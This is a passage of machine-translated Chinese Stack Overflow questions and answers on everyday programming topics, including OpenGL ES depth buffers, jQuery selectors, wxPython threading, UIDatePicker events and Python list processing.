*   你清理所有名字
*   您用新名称重命名磁盘上的所有图像

**编辑2：**

如果您对 utf8 有疑问，您应该`urlize`从[Doctrine_Inflector](https://github.com/doctrine/doctrine1/blob/master/lib/Doctrine/Inflector.php)进行检查。

然后使用：

```
$finalFileName    = Doctrine_Inflector::urlize($fileName).'-'.$fileUniqueSuffix.$fileExtension; 
```

# css - 如何在firefox中激活fireLESS

> ID：11866676
> 
> 赞同：1
> 
> 时间：2012-08-08T14:25:46.327
> 
> 标签：css, firefox, firebug, less

在Firefox中安装fireLESS后，如何激活它。

当我使用 firebug 检查元素时，我在 css 对话框中看不到任何 .less。

[https://addons.mozilla.org/en-us/firefox/addon/fireless/](https://addons.mozilla.org/en-us/firefox/addon/fireless/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:30:08.440

是否从这里获得了 less 的补丁版本：[patched version](https://github.com/simonedeponti/less.js)？

这对你来说是真的吗？

> 它目前仅在您在开发模式和浏览器模式下使用 LESS 时才有效（确保将 less.env 设置为“开发”）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-08T20:31:20.557

对于 1.6+ 的 lessjs ，现在不需要修补版本，安装 fireless 并将这些行放在链接 less.js 文件的行之前。

```
<script>
var less = {
env:"development",
dumpLineNumbers:'mediaquery'
};
</script> 
```

例如。

```
<link rel="stylesheet/less" href="style.less" />
<script>
var less = {
env:"development",
dumpLineNumbers:'mediaquery'
};
</script>
<script src="js/less.js"></script> 
```

您将能够看到更少的 CSS 样式以及声明样式的行号。这对我有用。

# php - 访问网络交换机上的网页

> ID：11866679
> 
> 赞同：0
> 
> 时间：2012-08-08T14:25:53.250
> 
> 标签：php, network-programming, telnet

我正在尝试为一些 hp 和 cisco 交换机构建一个 php 接口。我有一些代码可以通过 telnet 连接，然后解析结果。但我只是想知道是否有人知道是否有办法以某种方式访问​​内置于 swtiches 中的网页。比如说 HP 5406 或 3500？查看他们的代码以查看是否有更简洁的方法来解释开关命令的结果会很有用...谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:33:39.340

您可以 fopen() 开关的管理界面 url。借助 Live HTTP Headers 或一些类似的浏览器插件，您可以抓取 GET 或 POST 请求并解析响应网页，并尝试模拟人类行为并尝试获得类似的结果。

如果 web 界面使用 flash 或 java 小程序，它会更难实现，这取决于它用于与交换机通信的数据。

更清洁的方式？难以实施。模拟 POST 和 GET 请求是我认为最干净的方式。

# casperjs - 使用 CasperJS userAgent 函数的正确方法是什么？

> ID：11866683
> 
> 赞同：1
> 
> 时间：2012-08-08T14:26:07.857
> 
> 标签：casperjs

不知道我在这里做错了什么......

我的代码：

```
var casper = require('casper').create({
    verbose: true,
    stepTimeout: 10000,
    onError: function() {
        this.captureSelector('error.png', 'html');
    },
    logLevel: "debug"
});

casper.start();

casper.userAgent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');

casper.setHttpAuth('user', 'pass');

casper.thenOpen('https://www.google.com');

casper.then(function() {
    this.echo(this.getCurrentUrl());
    currentPage = this.getTitle();
    this.captureSelector(currentPage + '.png', 'html');
});                                

casper.run(); 
```

我的错误：

```
$ casperjs test.js
[info] [phantom] Starting...
FAIL TypeError: 'undefined' is not a function (evaluating 'casper.userAgent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')')
#    type: uncaughtError
#    error: "TypeError: 'undefined' is not a function (evaluating 'casper.userAgent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')')"
TypeError: 'undefined' is not a function (evaluating 'casper.userAgent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-31T12:21:19.787

刚刚结束这个问题，这是 CasperJS 版本的问题。这里没有错（请参阅@Niko 和@jnthnclrk，原始海报的问题评论）。

# android - OpenGL ES深度缓冲区android，无法工作

> ID：11866686
> 
> 赞同：6
> 
> 时间：2012-08-08T14:26:18.647
> 
> 标签：android, opengl-es, opengl-es-2.0

我无法让深度缓冲区在 Android OpenGL ES 2.0 上正常工作。不管我做什么，对象总是按照提供的顺序渲染，并完全忽略深度缓冲区。

根据我的阅读，默认设置应该有一个深度缓冲区，但我仍然尝试了我能想到的所有功能来让它工作：

```
//setup
setEGLContextClientVersion(2);
setEGLConfigChooser( true );

GLES20.glEnable( GLES20.GL_DEPTH_TEST );
GLES20.glDepthFunc( GLES20.GL_LEQUAL );
GLES20.glDepthMask( true );

//render
GLES20.glClearColor(0.8f, 0.5f, 0.8f, 1.0f);
GLES20.glClearDepthf(1.0f);
GLES20.glClear(GLES20.GL_COLOR_BUFFER_BIT | GLES20.GL_DEPTH_BUFFER_BIT); 
```

我将对象放置在 z 轴的 0.5、0.0、-0.5 处。我可以验证这是否有效，因为如果我使用透视图，它将正确地改变对象的大小（远处的对象更小）——我的顶点着色器除了应用视图矩阵之外什么都不做。如果我是正确的，我根本无法在 ES 中更改片段着色器中的深度，所以这不会是错误的。

我难住了。我真的不知道我还能检查什么。我所做的每一次搜索（在网络上或此处）都会给出似乎无法解决问题的答案（尽管它表明人们由于其他原因遇到了问题）。ES 2.0 中的大多数示例实际上并没有足够的对象来测试深度缓冲区，所以我也不能肯定示例代码是正确的。

* * *

评论：在我的派生 GLSurfaceView 中调用“super”之后，在设置渲染器之前调用我的“setup”部分。“渲染”部分首先在我的渲染“onDrawFrame”中调用。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-08T20:49:38.993

您是否指定了缓冲区深度？这可能是您问题的解决方案。

```
myGlSurfaceView.setEGLConfigChooser(8, 8, 8, 8, 16, 0); 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-08-10T05:25:03.420

harism 的评论是正确的答案。只有拥有渲染上下文后，才能完成以下三个功能。我将它们放在 onSurfaceCreated 方法中，它可以工作。如果在渲染过程中更改它们，也可以将它们放在 onDraw 方法中。

```
GLES20.glEnable( GLES20.GL_DEPTH_TEST );
GLES20.glDepthFunc( GLES20.GL_LEQUAL );
GLES20.glDepthMask( true ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-11-30T13:57:58.347

我有同样的问题。我通过使用 24 位深度缓冲区而不是默认的 16 位来修复它（因此选择 16 位深度缓冲区不会有任何区别）。我用了

`myGlSurfaceView.setEGLConfigChooser(8,8,8,8,24,0);`

顺便说一句，我在 iOS 上遇到了同样的问题，实际上使用了相同的解决方案（我的代码是一个便携式地图渲染器，所以我需要它在很多平台上运行）。iOS修复是调用

`self.drawableDepthFormat = GLKViewDrawableDepthFormat24;`

在我的 GLKView 派生类的 init 函数中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-01-17T12:23:00.477

如果您使用[Google/Android Grafika](https://github.com/google/grafika)示例中的 EglCore 类，您需要取消注释行以启用深度缓冲区！

```
 int[] attribList = {
            EGL14.EGL_RED_SIZE, 8,
            EGL14.EGL_GREEN_SIZE, 8,
            EGL14.EGL_BLUE_SIZE, 8,
            EGL14.EGL_ALPHA_SIZE, 8,
            //EGL14.EGL_DEPTH_SIZE, 16, 
```

[https://github.com/google/grafika/blob/master/app/src/main/java/com/android/grafika/gles/EglCore.java#L158](https://github.com/google/grafika/blob/master/app/src/main/java/com/android/grafika/gles/EglCore.java#L158)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-12-29T16:13:24.840

就我而言，既不需要`setEGLConfigChooser`，`glDepthFunc`也不`glDepthMask`需要（它们可能是可选的）。要启用深度缓冲区功能，只需添加`glEnable(GL_DEPTH_TEST)`就`onSurfaceCreated`足够了。问题的原因在另一个地方。

对我来说，关键的解决方案是改变这一**行`onDrawFrame`**：

```
glClear(GL_COLOR_BUFFER_BIT); 
```

至

```
glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); 
```

大纲如下（在 Kotlin 中）：

```
override fun onSurfaceCreated(gl10: GL10, eglConfig: EGLConfig) {
    glEnable(GL_DEPTH_TEST)

    // Do something
}

override fun onDrawFrame(gl10: GL10) {
    glClear(GL_COLOR_BUFFER_BIT or GL_DEPTH_BUFFER_BIT)

    // Do something
} 
```

# javascript - 如何使用 jquery 删除指定元素？

> ID：11866696
> 
> 赞同：1
> 
> 时间：2012-08-08T14:26:43.677
> 
> 标签：javascript, jquery, css

我的脚本有点问题。我需要检查一些跨度，如果我中间有一些内容，我什么也不做......但如果它是空的，我想删除这个跨度或例如更改样式。现在，当指定跨度为空时，脚本会清除我所有的跨度，即使它们不是空的。你能帮助我吗？

html

```
<span class="insert_list_item"></span>
<span class="insert_list_item">data</span> 
```

脚本

```
if ($('.insert_list_item').length > 0){
    $('.insert_list_item').each().remove();
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:28:31.463

采用`:empty`

```
$('.insert_list_item:empty').remove() 
```

删除所有空元素。或者

```
 $('.insert_list_item:not(:empty)').remove() 
```

删除所有非空元素

在[http://api.jquery.com/category/selectors/](http://api.jquery.com/category/selectors/)你可以看到所有可用的选择器。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:30:10.387

**每个检查长度：**

```
$('.insert_list_item').each( function(){
     var span = $(this);
     if (span.html().length === 0) {
         span.remove();
     }
}); 
```

或者

**使用 :empty: 过滤**

```
$('.insert_list_item').filter(":empty").remove(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-08T14:30:47.293

怎么样：

```
$( '.insert_list_item' ).filter(function () { 
    return $.trim( $( this ).text() ) === '';
}).remove(); 
```

**现场演示：http:** [//jsfiddle.net/RMZLm/](http://jsfiddle.net/RMZLm/)

请注意，此解决方案也适用于包含空格（例如`<span class="insert_list_item"> </span>`）的 SPAN 元素。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T14:28:53.223

使用条件里面`each`。因为 each 遍历选择器返回的所有元素。

```
$('.insert_list_item').each(function(){

  if($(this).html().length === 0)
       $(this).remove();
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-08T14:29:28.637

试试这个：

```
if ($('.insert_list_item').text().length > 0){
    $('.insert_list_item').remove();
} 
```

# ruby-on-rails - 在多个位置嵌套 Rails 资源

> ID：11866698
> 
> 赞同：4
> 
> 时间：2012-08-08T14:26:50.177
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2

在构建 Rails 应用程序时，我最近遇到了一种情况，我希望一个资源可以在多个其他资源的上下文中访问，并且根据上下文的不同表现略有不同。处理此类事情的最佳方法是什么？目前，我通过将资源嵌套在多个父资源中来处理这个问题。然而，这变得有些麻烦，我想知道是否有更好的方法来做到这一点。

* * *

**例子：**

假设我有一个 UserRights 模型，并且我希望用户能够在单个用户或整个用户组的上下文中查看、创建和编辑这些权限：

```
resources :users do
  resources :user_rights, context: :user # params[:context] = :user
end

resources :groups do
  resources :user_rights, context: :group
end 
```

这会生成路线：

```
users/:user_id/user_rights/:id
groups/:group_id/user_rights/:id 
```

然后，在控制器中，我根据上下文处理的事情略有不同。

这允许我在客户端提供一个相当不错的 UI，用户可以在其中查看和编辑组拥有的所有权限，或用户拥有的所有权限。有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:42:20.750

不，您需要的上下文越多，不幸的是，它需要的复杂性就越高。如果您将 API 添加到您的应用程序，它可能会变得更加复杂，因为您通常需要基本资源，而不是嵌套资源。我发现的唯一解决方案是尝试通过不创建最常用的路由来达到平衡，然后通过让这些请求符合要求来消除其余的路由。令人困惑，是的！

# android - 具有大 Spannable 的 EditText 需要很长时间才能重排

> ID：11866701
> 
> 赞同：7
> 
> 时间：2012-08-08T14:26:53.973
> 
> 标签：android, android-edittext

我有一个带有一个大的多行 EditText 的视图，它包装了它的高度内容并包含在 Scrollview 中。基本上它类似于全屏文本编辑器界面。

对于这种情况，如果我加载使用 SpannableStringBuilder 创建的非常大的样式 Spannable（内存中大约 1MB），那么在编辑 EditText 的内容时它会变得非常慢。这尤其发生在文档的中间或开头，似乎需要重排更多文本。如果您编辑最后一段或文档结尾，则性能实际上相当不错。

在文档开头编辑文本时，如何使这项工作更快？如何覆盖 EditText 的默认行为并使其快速运行而无需使用许多 EditText 的 ListView 或类似的东西？我想将它保存在一个 EditText 中以保持复制和粘贴简单。

我在想我也许可以让 EditTexts 内容更小，并在滚动 ScrollView 时对其进行调整，但我不知道该怎么做。

谢谢

# linux - 是否可以使用 ss7 协议通过 ss7 线路发送传真数据？

> ID：11866703
> 
> 赞同：0
> 
> 时间：2012-08-08T14:27:00.213
> 
> 标签：linux

我们使用 ISDN 协议发送传真。是否可以使用 ss7 协议通过 ss7 线路发送传真数据？如果是，请告知 ss7 线路的传真数据流架构。它用于发送传真的程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:59:53.243

您可以通过 SS7ISUP 发送传真数据，而不是通过纯 SS7。查看 SS7ISUP 上的规格以获取更多详细信息。

> ISUP 执行与 TUP 相同的功能（即，它处理电话呼叫的建立和拆除），但它提供的功能要复杂得多，可用于初级速率 ISDN。这包括呼叫和被叫号码通知（或抑制）、控制计费（收费）费率的能力、高级电话功能（如转接）以及控制语音通道是否用于语音、传真或数据。
> 
> 与 TUP 一样，ISUP 消息仅在呼叫的建立和拆除阶段流动。

[http://pic.dhe.ibm.com/infocenter/wvraix/v6r1m0/index.jsp?topic=%2Fcom.ibm.wvraix.newss7.doc%2Fthess7protocolstac3.html](http://pic.dhe.ibm.com/infocenter/wvraix/v6r1m0/index.jsp?topic=%2Fcom.ibm.wvraix.newss7.doc%2Fthess7protocolstac3.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-01T14:21:36.437

作为一个工作示例，使用 Asterisk 可以通过 TDM 和 IP 通道开发传真服务器。如果选择 TDM，则应使用 CTI 板建立通道。IP 通道使用 G.711 音频编码或 T.38 协议。在任何情况下，您的传真服务器都应该通过它们的 SS7 网关集成到 PSTN 或 MNO。

# c# - 从 c# 2.0 中的一系列值中获取不同值的有效逻辑

> ID：11866705
> 
> 赞同：5
> 
> 时间：2012-08-08T14:27:08.980
> 
> 标签：c#

我有一个范围列表。每个范围都有一个 from 和 to 值，这意味着该值可以介于该范围之间。例如，如果范围是 (1,4)。，值可以是 1,2,3 和 4。现在，我需要在给定的范围列表中找到不同的值。下面是示例代码。

```
class Program
{
    static void Main(string[] args)
    {
        List<Range> values = new List<Range>();
        values.Add(new Range(1, 2));
        values.Add(new Range(1, 3));
        values.Add(new Range(1, 4));
        values.Add(new Range(3, 5));
        values.Add(new Range(7, 10));
        values.Add(new Range(7, 8));

        // Expected Output from the range of values
        //1,2,3,4,5,7,8,9,10
    }
}
class Range
{
    public Range(int _form, int _to)
    {
        from = _from;
        to = _to;
    }
    private int from;

    public int From
    {
        get { return from; }
        set { from = value; }
    }

    private int to;

    public int To
    {
        get { return to; }
        set { to = value; }
    }

} 
```

我可以遍历每个范围并找到不同的值。但是，如果有人可以提供一种有效的方法，那将很有帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:39:30.483

*   对于少数间隔，直接的方法应该可以解决问题。
*   如果大多数间隔相互折叠，您可以执行合并它们的初步步骤以减少测试次数
*   如果不相交区间的数量很高，请构建一个[*区间树*](http://en.wikipedia.org/wiki/Interval_tree)。这是一篇带有 Java 代码示例的文章的[链接。](http://www.thekevindolan.com/2010/02/interval-tree/index.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:48:27.140

请考虑以下解决方案（我不会写完整的代码，只写一般路线）：

*   对于每个传入范围调整 MinVal 和 MaxVal 变量 - 分别保持所有范围中的最小值和所有范围中的最大值
*   建立两个传入范围的集合，让一个名字成为另一个`Begins`名字`Ends`
*   收集所有 Ranges 后对两个集合进行排序：`Begins`应按`from`值排序，`Ends`应按`to`值排序
*   `depth`将计数器变量初始化为 0
*   初始化`BeginPointer`并`EndPointer`到各个集合的第一个元素
*   现在是关键部分：从`MinVal`to迭代`MaxVal`，如果当前值指示收集的开始（当前`BeginPointer`的数字等于迭代值）-> 增加`depth`1 并向前移动`BeginPointer`（重复连续的“开始”）
*   如果`depth`大于 0 -> 打印当前迭代值，因为我们在某个范围内
*   如果当前值指示收集结束 -> 减`depth`1（重复连续“结束”）

这将适用于更大范围的值。如果最大值相对较低（即 1000，如评论中的 OP 所示 - 请参阅我的其他答案）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:58:36.880

如果`_from`和的范围`_to`很小（如所示为 1000），则可以使用布尔数组 [1000]。对于每个传入的 Range，将相应的数组元素设置为 true。即对于 Range(3,6)，将数组元素 3、4、5 和 6 设置为 true。现在遍历数组并打印每个为真的索引。对于小范围应该足够有效。

# python - wxpython 应用程序使用 pjsip 与多线程崩溃

> ID：11866708
> 
> 赞同：0
> 
> 时间：2012-08-08T14:27:23.490
> 
> 标签：python, multithreading, wxpython, pjsip

我正在使用`wxpython`and做一个应用程序`pjsip`，我需要使用多线程，因此每个调用都由它自己的线程处理，但由于某种原因，应用程序崩溃并意外关闭，立即出现以下错误：

```
Gdk-ERROR **: The program 'python' received an X Window System error. 
```

这可能反映了程序中的错误。

错误是`RenderBadPicture (invalid Picture parameter)`。

```
python: xcb_io.c:221: poll_for_event: Assertion `(((long) (event_sequence) - (long) (dpy->request)) <= 0)' failed. 
```

我读到这发生在多线程和`wxpython`. 我尝试使用`wx.callafter()`and `wx.lib.pubusub.Subscribe`，但我仍然遇到同样的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T13:47:11.383

当与 wxPython 相关时，来自主线程以外的线程的任何内容都必须包装在线程安全方法中。其中有 3 个：wx.CallAfter、wx.CallLater 和 wx.PostEvent。如果您尝试直接从单独的线程访问 wxPython 方法，那么您几乎肯定会遇到问题。Pubsub 很棒，但它不是线程安全的。它也必须包含在其中一种线程安全方法中。

[wxPython wiki](http://wiki.wxpython.org/LongRunningTasks)有几个线程示例，我也写了一个关于这个主题的简单[教程。](http://www.blog.pythonlibrary.org/2010/05/22/wxpython-and-threads/)如果这些都没有帮助，那么您需要创建一个小的、可运行的示例并将其发布在此处或 wxPython 邮件列表中。

# objective-c - 观察 UIDatePicker 的变化

> ID：11866712
> 
> 赞同：45
> 
> 时间：2012-08-08T14:27:34.310
> 
> 标签：objective-c, ios, uidatepicker, key-value-observing

我注意到没有代表来观察 UIDatePicker 的变化。有没有一种方法可以在不确认任何内容的情况下检测选择器何时发生更改，例如它旋转并落在一个新数字上的那一刻，我希望能够检测到这一点。我考虑过键值观察，但我认为没有一个属性会当场发生变化

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-08-08T14:38:08.827

您需要将`UIControlEventValueChanged`事件添加到您的 UIDatePicker 以处理日期更改：

```
[myDatePicker addTarget:self action:@selector(dateIsChanged:) forControlEvents:UIControlEventValueChanged]; 
```

然后实现：

```
- (void)dateIsChanged:(id)sender{
     NSLog(@"Date changed");
} 
```

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2012-08-08T14:39:16.843

转到 IB 并从`UIDatePicker`.h 文件中拖动。然后选择![在此处输入图像描述](../Images/32a10ac978bd9adf5a37fa637036f45e.png)

在 .m 文件中随心所欲地处理它；XCode 将为您添加以下方法。

![在此处输入图像描述](../Images/f24b13cbe77869af046b67b454d5bd9b.png)

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2019-03-27T13:28:58.197

**斯威夫特 4.2 | Xcode 10.1**

```
@objc func handleDatePicker(_ datePicker: UIDatePicker) {
    textField.text = datePicker.date.formatted
}

override func viewDidLoad() {
    super.viewDidLoad()
    datePicker.addTarget(self, action: #selector(handleDatePicker), for: .valueChanged)
} 
```

* * *

```
extension Date {
    static let formatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.dateFormat = "EEEE, dd MMM yyyy HH:mm:ss Z"
        return formatter
    }()
    var formatted: String {
        return Date.formatter.string(from: self)
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-02-27T08:21:38.393

这是一个符合 KVO 的日期选择器的建议：

```
@interface LNKVODatePicker : UIDatePicker

@end

@implementation LNKVODatePicker

- (void)willMoveToWindow:(UIWindow *)newWindow
{
    [super willMoveToWindow:newWindow];

    [self removeTarget:self action:@selector(_didChangeDate) forControlEvents:UIControlEventValueChanged];

    if(newWindow != nil)
    {
        [self addTarget:self action:@selector(_didChangeDate) forControlEvents:UIControlEventValueChanged];
    }
}

- (void)dealloc
{
    [self removeTarget:self action:@selector(_didChangeDate) forControlEvents:UIControlEventValueChanged];
}

- (void)_didChangeDate
{
    [self willChangeValueForKey:@"date"];
    [self didChangeValueForKey:@"date"];
}

@end 
```

# javascript - 如何使用 jQuery 制作搜索引擎？

> ID：11866714
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:27:35.050
> 
> 标签：javascript, jquery, search

我的问题是我必须制作一个像 Gmail 的撰写邮件这样的搜索引擎。当我们输入电子邮件 ID 时，它会搜索我们的联系人列表并显示搜索结果。

我能够在数据库中搜索电子邮件，但我无法将任何一个搜索到的电子邮件附加到它所搜索的文本框中。

我的代码：

*   [索引.html](http://pastebin.com/8ZWpe1yg)
*   [jQuery](http://pastebin.com/9BhCeb6d)
*   [搜索.php](http://pastebin.com/3iKJSD9S)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:48:28.277

我不确定您是如何尝试这样做的，但我建议您使用[jQuery UI Autocomplete](http://jqueryui.com/demos/autocomplete/)

# python - 用一个键和多个值更改字典以获得所需输出的 Pythonic 方法是什么？

> ID：11866716
> 
> 赞同：4
> 
> 时间：2012-08-08T14:27:40.870
> 
> 标签：python, mysql, list, dictionary

**手头的问题：**

我有以下元组列表（ID，Country），我最终将存储在 MySQL 表中。

```
mylist = [(10, 'Other'), (10, 'India'), (10, 'Unknown'), (11, 'Other'), (11, 'Unknown'), (12, 'USA'), (12, 'UK'), (12, 'Other')] 
```

我想使用以下条件处理“其他”和“未知”：

```
Value       Replaced by => This value
----------------------------------------
Other & Unknown         => Other
A country & Other       => Country
A country & Unknown     => Country 
```

**Python ：**

```
def refinelist(mylist):

    '''Updating the list to remove unwanted values'''
    '''
    Other & Unknown => Other
    A country & Other => Country
    A country & Unknown => Country
    '''

    if 'Other' in mylist and 'Unknown' in mylist:
        print 'remove unknown'
        mylist.remove('Unknown')
    if 'Other' in mylist and len(mylist) >= 2:
        print 'remove other'
        mylist.remove('Other')
    if 'Unknown' in mylist and len(mylist) >= 2:
        print 'remove unknown'
        mylist.remove('Unknown')

    return mylist

def main():

    mylist = [(10, 'Other'), (10, 'India'), (10, 'Unknown'), (11, 'Other'), (11, 'Unknown'), (12, 'USA'), (12, 'UK'), (12, 'Other')]

    d = {}

    for x,y in mylist:
        d.setdefault(x, []).append(y)

    # Clean the list values    
    for each in d:
        d[each] = refinelist(d[each])

    ## Convert dict to list of tuples for database entry

    outlist = []

    #result = [(key, value) for key,value in d.keys(), value in d.values()]  ## Couldn't get this to work. Can the below loop be written as list comprehension with minimal footprint?

    for key, value in d.items():
        if len(value) == 1:
            print key, value[0]
            outlist.append((key, value[0]))
        elif len(value) > 1:
            for eachval in value:
                print key, eachval
                outlist.append((key, eachval))

    print outlist

if __name__ == "__main__":
    main() 
```

**输出 ：**

```
remove unknown
remove other
remove unknown
remove other
10 India
11 Other
12 USA
12 UK
[(10, 'India'), (11, 'Other'), (12, 'USA'), (12, 'UK')] 
```

**问题 ：**

我觉得这可以更有效地完成。使用 dict 是否矫枉过正？

我从一个元组（luples）列表开始，将其转换为字典，执行干净的操作，然后将其转换回 luples？

我可以在 MySQL 表中插入原始的 luples，然后用很少的查询处理“未知”和“其他”，但我更喜欢 Python 来完成这项任务。

非常感谢 Pythonic 解决方案或对代码的一些批评。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-08T14:47:52.850

广泛使用生成器和列表推导，你可以这样写：

```
other = ['Other', 'Unknown']                        # Strings denoting non-contries
ids = set(i for i,j in mylist)                      # All ids in the list
known = set(i for i,j in mylist if j not in other)  # Ids of real countries
outlist = [k for k in mylist if k[1] not in other]  # Keep all real countries
outlist.extend((i, other[0]) for i in ids - known)  # Append "Other" for all IDs with no real country 
```

结果将是

```
[(10, 'India'), (12, 'USA'), (12, 'UK'), (11, 'Other')] 
```

如果订单很重要，这将意味着更多的工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:55:45.430

一方面，您的代码会在每次删除调用时导致大量昂贵的列表操作。如果顺序很重要，您可以执行以下操作，只需先排序，然后再浏览列表一次。（我把它写成一个生成器，这样你（1）如果你不需要创建一个列表（例如，如果你打算把它添加到数据库中）和（2）这样你就可以避免所有附加操作。

```
def filter_list(lst):
    lst = sorted(lst)
    curr_id = lst[0][0]
    found_country = False
    for id, elem in lst:
        if id != curr_id:
            if not found_country:
                yield (curr_id, "Other")
            curr_id = id
            found_country=False
        if elem not in ("Other", "Unknown"):
            yield (curr_id, elem)
            found_country = True 
```

如果您只想获取列表，请使用 list(filter_list(input_list)) 。（坦白承认它不是最优雅的）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T16:12:48.627

更短但可能更慢的解决方案：

```
 na_list = ['Other', 'Unknown']
    data = dict()
    result = list()

    for i in mylist:
        k = str(i[0])
        data.setdefault(k, [])
        data[k].append(i[1])

    for k,v in data.iteritems():
       if not len(set(v) - set(na_list)):
           result.append((int(k), na_list[0]))
    else:
       for c in set(v) - set(na_list):
           result.append((int(k), c)) 
```

# java - 如何检查 Throwable 是否是无效电子邮件地址的结果

> ID：11866717
> 
> 赞同：2
> 
> 时间：2012-08-08T14:27:39.267
> 
> 标签：java, exception-handling, jakarta-mail

注意：我当前的解决方案正在运行（我认为）。我只是想确保我没有遗漏任何东西。

**我的问题：**我想知道如何检查是否由于电子邮件地址无效而导致异常。使用 Java 邮件。

目前我正在检查[SMTPAddressFailedException](http://javamail.kenai.com/nonav/javadocs/com/sun/mail/smtp/SMTPAddressFailedException.html)与[getAddress()](http://javamail.kenai.com/nonav/javadocs/com/sun/mail/smtp/SMTPAddressFailedException.html#getAddress%28%29)和[AddressException](http://docs.oracle.com/javaee/1.4/api/javax/mail/internet/AddressException.html)与[getRef()](http://docs.oracle.com/javaee/1.4/api/javax/mail/internet/AddressException.html#getRef%28%29)。

这是我目前进行检查的方法。*我错过了什么吗？*

```
/**
* Checks to find an invalid address error in the given exception. Any found will be added to the ErrorController's
* list of invalid addresses. If an exception is found which does not contain an invalid address, returns false.
*
* @param exception the MessagingException which could possibly hold the invalid address
* @return if the exception is not an invalid address exception.
*/
public boolean handleEmailException(Throwable exception) {
  String invalidAddress;
  do {
    if (exception instanceof SMTPAddressFailedException) {
      SMTPAddressFailedException smtpAddressFailedException = (SMTPAddressFailedException) exception;
      InternetAddress internetAddress = smtpAddressFailedException.getAddress();
      invalidAddress = internetAddress.getAddress();
    } else if (exception instanceof AddressException) {
      AddressException addressException = (AddressException) exception;
      invalidAddress = addressException.getRef();
    }
    //Here is where I might do a few more else ifs if there are any other applicable exceptions.
    else {
      return false;
    }
    if (invalidAddress != null) {
      //Here's where I do something with the invalid address.
    }
    exception = exception.getCause();
  } while (exception != null);
  return true;
} 
```

* * *

注意：如果您好奇（或者它有帮助），我会使用[Java Helper Library](https://github.com/kentcdodds/Java-Helper)来发送电子邮件（请参阅此[行](https://github.com/kentcdodds/Java-Helper/blob/master/src/com/kentcdodds/javahelper/helpers/EmailHelper.java#L135)），因此最初会引发错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:46:39.993

您通常不需要强制转换异常；这就是为什么你可以有多个 catch 块：

```
try {
    // code that might throw AddressException
} catch (SMTPAddressFailedException ex) {
    // Catch subclass of AddressException  first
    //  ...
} catch (AddressException ex) {
    // ...
} 
```

如果你担心嵌套异常，可以使用 Guava 的`Throwables.getRootCause`.

# android - 列表视图崩溃

> ID：11866719
> 
> 赞同：3
> 
> 时间：2012-08-08T14:27:53.790
> 
> 标签：android

我正在尝试创建`ListView`并用数据填充它，但是当我启动应用程序时崩溃并向我显示一条消息

> 不幸已经停止了。

我正在尝试做这个[教程](http://www.vogella.com/articles/AndroidListView/article.html)。

* * *

布局

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <ListView
        android:id="@+id/mylist"
        android:layout_width="match_parent"
        android:layout_height="wrap_content" >
    </ListView>

</LinearLayout> 
```

* * *

main.java

```
public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String[] actions = new String[] { "Android", "iPhone", "WindowsMobile",
            "Blackberry", "WebOS", "Ubuntu", "Windows7", "Max OS X",
            "Linux", "OS/2" };

        ArrayAdapter<String> value = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,
                R.id.mylist, actions);

        ListView  v = (ListView)findViewById(R.id.mylist);
        v.setTextFilterEnabled(true);
        v.setAdapter(value);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

} 
```

* * *

日志

```
08-08 15:19:47.364: E/Trace(604): error opening trace file: No such file or directory (2)
08-08 15:19:47.945: I/Choreographer(604): Skipped 40 frames!  The application may be doing too much work on its main thread.
08-08 15:19:47.965: D/AndroidRuntime(604): Shutting down VM
08-08 15:19:47.995: W/dalvikvm(604): threadid=1: thread exiting with uncaught exception (group=0x40a13300)
08-08 15:19:48.015: E/AndroidRuntime(604): FATAL EXCEPTION: main
